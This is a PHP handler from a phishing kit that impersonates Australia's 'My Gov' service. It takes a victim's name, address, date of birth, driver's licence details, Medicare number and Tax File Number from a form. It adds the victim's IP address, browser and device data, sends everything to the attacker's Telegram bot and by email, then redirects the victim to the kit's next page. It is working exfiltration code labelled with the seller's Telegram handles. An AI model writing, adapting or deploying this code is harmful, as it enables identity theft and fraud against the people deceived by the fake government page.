<?php
error_reporting(0);
session_start();
include("./ServerData.php");
include("../../edit.php");


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$fullname = clean($_POST['names']);
	$addr = clean($_POST['addr']);
	$dob = clean($_POST['dob']);
	$dln = clean($_POST['dln']);
	$dlcn = clean($_POST['dlcnum']);
	$dlexp = clean($_POST['dlexp']);
	$mdcnum = clean($_POST['mednum']);
	$irf = clean($_POST['irn']);
	$tfn = clean($_POST['tfnum']);
	

	$message .= "
	<h2 style='text-align: center;'><span style ='color : blue;'>TELEGRAM </span>: TROJAN<span style='color:red;'>VSL</span></h2>
	<h3 style='text-align: center'>MY GOV</h3><br>
	<h3 style='text-align: center'>INFORMATION</h3><br>
	<ul>
		<li>Full Name : " . $fullname . "</li><br>
		<li>Address on File : " . $addr . "</li><br>
		<li>Date of Birth : " . $dob . "</li><br>
		<li>Driver's License Number : " . $dln . "</li><br>
		<li>Driver's License Card No. : " . $dlcn . "</li><br>
		<li>Driver's License Expiry Date : " . $dlexp . "</li><br>
		<li>Medicare Number : " . $mdcnum . "</li><br>
		<li>Individual Reference Number : " . $irf . "</li><br>
		<li>Tax File Number : " . $tfn . "</li><br>
	</ul>
	<br>
	<h3 style='text-align: center'>IP HOSTNAME DATA</h3><br>
	<ul>
		<li>Country: " . visitor_country() . "</li><br>
		<li>VICTIM DNS: " . $dns . "</li><br>
		<li>IP Address 1: " . $realip . "</li><br>
		<li>IP Address 2: " . $customip  . "</li><br>
		<li>Browser: " . $browser . "</li><br>
		<li>Device/OS: " . $OS . "</li><br>
	</ul>";

	$Gram .= "
[TG: h4ckecho]
[MY GOV : INFORMATION]

	Full Name : " . $fullname . "
	Address on File : " . $addr . "
	Date of Birth : " . $dob . "
	Driver's License Number : " . $dln . "
	Driver's License Card No. : " . $dlcn . "
	Driver's License Expiry Date : " . $dlexp . "
	Medicare Number : " . $mdcnum . "
	Individual Reference Number : " . $irf . "
	Tax File Number : " . $tfn . "
	

	[IP HOSTNAME DATA]
	
	Country: " . visitor_country() . "
	VICTIM DNS: " . $dns . "
	IP Address 1: " . $realip . "
	IP Address 2: " . $customip . "
	Browser: " . $browser . "
	Device/OS: " . $OS . "";

	$response = sendMessage($botToken, $chatID, $Gram);

	$subject = "My Gov [Login Access] from : " . $realip . "\r\n";
	$headers[] = 'MIME-Version: 1.0';
	$headers[] = 'Content-type: text/html; charset=iso-8859-1';
	$headers[] = 'From: MyGov <example@vslmail.com>';
	$headers[] = 'To: You <user@vslmail.com>';
	mail($receiver, $subject, $message,  implode("\r\n", $headers))
		? header("Location: ../../user/checkverify")
		: header("Location: ../../user/personal");
}